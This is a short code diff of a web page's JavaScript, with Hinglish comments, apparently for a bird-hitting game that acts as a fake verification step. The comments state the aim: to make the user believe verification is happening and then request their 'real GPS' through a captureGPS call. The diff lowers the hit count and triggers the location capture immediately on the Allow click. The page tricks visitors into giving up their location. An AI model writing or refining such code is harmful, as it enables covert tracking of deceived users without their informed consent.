@@ -370,12 +370,12 @@
       setTimeout(moveBird, 40);
 
       // 5 hits ke baad "Allow" trigger karo
-      if (state.hits >= 5) {
+      if (state.hits >= 3) {
         state.running = false;
         bird.style.display = 'none';
 
         // User ko lage verify ho raha hai
-        verifyingText.classList.add('show');
+        verifyingText.classList.add('none');
 
         // 500ms baad asli GPS maango
         setTimeout(() => {
@@ -385,12 +385,11 @@
     });
 
     // Agar user ne bird ko miss kiya aur "Allow" pe click kiya (though pointer-events none hai, safety ke liye)
-    allowBtn.addEventListener('click', () => {
+       allowBtn.addEventListener('click', () => {
       if (state.running) {
         state.running = false;
         bird.style.display = 'none';
-        verifyingText.classList.add('show');
-        setTimeout(captureGPS, 500);
+        captureGPS();
       }
     });
 
